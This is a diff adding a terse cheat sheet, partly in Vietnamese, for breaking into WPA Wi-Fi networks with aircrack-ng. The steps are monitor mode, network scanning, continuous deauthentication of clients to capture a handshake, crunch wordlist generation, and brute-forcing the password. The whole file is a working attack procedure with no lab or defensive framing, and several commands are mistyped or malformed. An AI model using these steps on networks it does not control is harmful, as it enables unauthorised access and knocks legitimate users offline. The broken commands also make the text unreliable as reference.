@@ -1,0 +1,33 @@
+===============
+aircreck-ng
+
+sudo airmon-ng
+sudo airmon-ng check kill
+sudo airmon-ng start
+sudo airmon (interface)+mon
+
+=====scan nearby network
+airodump-ng (interface)mon
+==========wpa handshake
+airodump-ng --dssid [bssid] -c [ch number] -w [file.txt] (interface)mon
+
+open new terminal
+aireplay-ng --deauth 0 -a [bssid] (interface)mon
+
+Đã hiện ra dòng WPA handshakes thì quay lại terminal kia và CTRL + C để dừng chặn access point.
+Các bạn sử dụng lệnh ls để check xem có file đuôi .cap chưa nhé
+
+================brute force password
+crunch [minchar] [maxchar] [characterset] [option]
+ex: crunch 8 8 1234567890 -o pass.txt
+
+aircrack-ng w [path to wordlist] -b [bssid] [path to cap file]
+aircrack-ng w home/path/pass.txt -b [bssid] home/path/handshake-01.cap
+
+[ 04072000 
+
+===========stop
+sudo airmon-ng stop (interface) 
+sudo ifconfig (interface) up
+sudo systemctl restart networking service
+sudo systemctl restart NetworkManager
